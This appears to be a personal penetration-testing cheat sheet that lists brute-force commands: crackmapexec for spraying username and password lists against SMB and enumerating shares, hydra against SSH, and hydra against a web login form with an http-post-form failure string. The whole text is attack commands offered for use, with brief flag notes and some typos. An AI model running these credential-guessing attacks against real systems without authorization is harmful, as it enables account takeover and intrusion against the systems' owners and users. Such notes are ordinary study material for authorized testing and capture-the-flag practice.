#crackmapexec samba

crackmapexec smb -i <ip> -u 'usernmame.txt' -p 'password.txt' --shares

#hydra for ssh

hydra -L user.lst -P pass.lst <ip> ssh

```
-L = for list of usernames if single use -l
-P = for list of passwords if single use -p
-s = use if ssh on another port
```

#hdyra for login page

hydra -L user.lst -P pass.lst <ip> http-post-form "portal/login.php:user=^USER^&pass=^PASS^:F=Invalid"

```
http-post-form module, you can use https too
/portal/login.php process file
user =  tag name=
pass =  tag name=
```
